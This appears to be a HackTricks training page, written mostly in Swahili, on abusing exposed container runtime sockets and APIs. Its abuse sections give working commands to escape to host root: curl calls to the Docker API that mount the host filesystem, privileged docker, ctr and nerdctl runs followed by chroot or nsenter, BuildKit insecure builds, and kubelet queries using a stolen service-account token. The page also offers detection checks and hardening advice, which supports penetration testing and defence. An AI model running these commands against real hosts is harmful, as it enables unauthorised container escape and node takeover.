# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Ugomvi mwingi wa kweli wa container haufanyiki kwa kuanza na namespace escape kabisa. Huanza kwa kupata access kwenye runtime control plane. Ikiwa workload inaweza kuzungumza na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia mounted Unix socket au exposed TCP listener, mshambuliaji anaweza kuomba container mpya yenye privileges bora zaidi, ku-mount filesystem ya host, kujiunga na host namespaces, au kupata taarifa nyeti za node. Katika hali hizo, runtime API ndiyo boundary halisi ya security, na kuidhibiti kwa vitendo ni karibu sawa na kuidhibiti host.

Hii ndiyo sababu runtime socket exposure inapaswa kuandikwa kando na kernel protections. Container yenye ordinary seccomp, capabilities, na MAC confinement bado inaweza kuwa na api call moja tu kabla ya host compromise ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` ime-mount ndani yake. Kernel isolation ya container ya sasa inaweza kuwa inafanya kazi sawasawa kama ilivyokusudiwa wakati management plane ya runtime bado iko fully exposed.

## Daemon Access Models

Docker Engine kimapokeo hu-expose privileged API yake kupitia local Unix socket kwenye `unix:///var/run/docker.sock`. Kihistoria pia imekuwa iki-expose kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au TLS-protected listener kwenye `2376`. Ku-expose daemon kwa mbali bila strong TLS na client authentication hufanya Docker API kuwa remote root interface.

containerd, CRI-O, Podman, na kubelet hu-expose surfaces zinazofanana za athari kubwa. Majina na workflows hutofautiana, lakini logic haibadiliki. Ikiwa interface inamruhusu caller ku-create workloads, ku-mount host paths, kupata credentials, au kubadilisha containers zinazoendelea, interface hiyo ni privileged management channel na inapaswa kutibiwa hivyo.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Vihamisho vya zamani au vya zaidi maalum pia vinaweza kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hivyo ni visivyo vya kawaida zaidi katika mazingira ya kisasa, lakini vikikutwa vinapaswa kushughulikiwa kwa tahadhari ile ile kwa sababu vinawakilisha runtime-control surfaces badala ya ordinary application sockets.

## Secure Remote Access

Ikiwa daemon lazima ifichuliwe nje ya local socket, connection inapaswa kulindwa kwa TLS na ikiwezekana kwa mutual authentication ili daemon ithibitishe client na client ithibitishe daemon. Tabia ya zamani ya kufungua Docker daemon kwenye plain HTTP kwa urahisi ni moja ya makosa hatari zaidi katika container administration kwa sababu API surface ina nguvu ya kutosha kuunda privileged containers moja kwa moja.

Historical Docker configuration pattern ilionekana kama:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Kwenye hosts zinazotumia systemd, mawasiliano ya daemon pia yanaweza kuonekana kama `fd://`, ikimaanisha process hurithi socket iliyokuwa imefunguliwa awali kutoka systemd badala ya kujifunga yenyewe moja kwa moja. Funzo muhimu si syntax sahihi bali ni athari ya usalama. Mara tu daemon inaposikiliza nje ya local socket yenye ruhusa kali, transport security na client authentication vinakuwa lazima badala ya kuwa hardening ya hiari.

## Abuse

Ikiwa runtime socket ipo, thibitisha ni ipi, kama client inayolingana ipo, na kama raw HTTP au gRPC access inawezekana:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Amri hizi ni muhimu kwa sababu hutofautisha kati ya path iliyokufa, socket iliyopandishwa lakini isiyoweza kufikiwa, na live privileged API. Ikiwa client itafaulu, swali linalofuata ni kama API inaweza kuanzisha container mpya yenye host bind mount au host namespace sharing.

### When No Client Is Installed

Kutokuwepo kwa `docker`, `podman`, au nyingine friendly CLI hakumaanishi kuwa socket iko salama. Docker Engine huzungumza HTTP kupitia Unix socket yake, na Podman hutoa zote mbili Docker-compatible API na Libpod-native API kupitia `podman system service`. Hiyo inamaanisha environment ndogo yenye `curl` pekee bado inaweza kutosha kuendesha daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Hii ni muhimu wakati wa post-exploitation kwa sababu defenders wakati mwingine huondoa binaries za kawaida za client lakini huacha management socket ikiwa imewekwa. Kwenye host za Podman, kumbuka kuwa njia ya high-value hutofautiana kati ya deployments za rootful na rootless: `unix:///run/podman/podman.sock` kwa rootful service instances na `unix://$XDG_RUNTIME_DIR/podman/podman.sock` kwa rootless ones.

### Full Example: Docker Socket To Host Root

Ikiwa `docker.sock` inafikiwa, classical escape ni kuanzisha container mpya inayomount host root filesystem kisha `chroot` kuingia ndani yake:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Hii inatoa utekelezaji wa moja kwa moja wa host-root kupitia Docker daemon. Athari si kwa kusoma faili pekee. Mara tu akiwa ndani ya container mpya, mshambuliaji anaweza kubadilisha faili za host, kukusanya credentials, kupandikiza persistence, au kuanzisha privileged workloads za ziada.

### Full Example: Docker Socket To Host Namespaces

Ikiwa mshambuliaji anapendelea kuingia namespace badala ya access ya filesystem pekee:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Njia hii hufikia host kwa kuomba runtime iunde container mpya yenye kuonyesha wazi host-namespace badala ya kutumia container ya sasa.

### Full Example: containerd Socket

Socket ya `containerd` iliyopandishwa kawaida ni hatari sawa:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ikiwa mteja zaidi wa aina ya Docker yupo, `nerdctl` inaweza kuwa rahisi zaidi kuliko `ctr` kwa sababu inaonyesha flags za kawaida kama `--privileged`, `--pid=host`, na `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Athari tena ni host compromise. Hata kama zana mahususi za Docker hazipo, API nyingine ya runtime bado inaweza kutoa nguvu sawa ya kiutawala. Kwenye nodes za Kubernetes, `crictl` pia inaweza kuwa ya kutosha kwa reconnaissance na mwingiliano na container kwa sababu huongea moja kwa moja na endpoint ya CRI.

### BuildKit Socket

`buildkitd` ni rahisi kuikosa kwa sababu watu mara nyingi huiwazia kama "just the build backend", lakini daemon bado ni privileged control plane. `buildkitd.sock` inayoweza kufikiwa inaweza kumruhusu mshambuliaji kuendesha arbitrary build steps, kukagua worker capabilities, kutumia local contexts kutoka kwenye mazingira yaliyoathiriwa, na kuomba dangerous entitlements kama `network.host` au `security.insecure` wakati daemon ilisanidiwa kuziruhusu.

Mwingiliano wa kwanza unaofaa ni:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ikiwa daemon inakubali maombi ya build, jaribu kama insecure entitlements zinapatikana:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Athari halisi inategemea usanidi wa daemon, lakini huduma ya BuildKit yenye rootful na entitlements zenye ruhusa nyingi si urahisi usio na madhara kwa developer. Itazame kama eneo lingine la utawala lenye thamani kubwa, hasa kwenye CI runners na shared build nodes.

### Kubelet API Over TCP

Kubelet si container runtime, lakini bado ni sehemu ya node management plane na mara nyingi iko ndani ya mazungumzo yale yale ya trust boundary. Ikiwa secure port ya kubelet `10250` inaweza kufikiwa kutoka kwenye workload, au ikiwa node credentials, kubeconfigs, au proxy rights zimefichuliwa, mshambulizi anaweza kuwa na uwezo wa kuorodhesha Pods, kupata logs, au kutekeleza commands kwenye node-local containers bila hata kugusa Kubernetes API server admission path.

Anza na discovery rahisi:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ikiwa njia ya kubelet au API-server proxy inaidhinisha `exec`, mteja mwenye uwezo wa WebSocket anaweza kuibadilisha kuwa code execution ndani ya containers nyingine kwenye node. Hii pia ndiyo sababu `nodes/proxy` yenye ruhusa ya `get` pekee ni hatari zaidi kuliko inavyoonekana: ombi bado linaweza kufikia kubelet endpoints zinazotekeleza commands, na mwingiliano huo wa moja kwa moja na kubelet hauonyeshwi katika kawaida ya Kubernetes audit logs.

## Checks

Lengo la checks hizi ni kujibu kama container inaweza kufikia management plane yoyote ambayo ilipaswa kubaki nje ya trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Ni nini cha kuvutia hapa:

- Runtime socket iliyowekwa kwa mount kawaida ni primiti ya moja kwa moja ya kiutawala badala ya kuwa tu disclosure ya taarifa.
- TCP listener kwenye `2375` bila TLS inapaswa kuchukuliwa kama hali ya remote-compromise.
- Environment variables kama `DOCKER_HOST` mara nyingi hufichua kwamba workload iliundwa kwa makusudi kuzungumza na host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
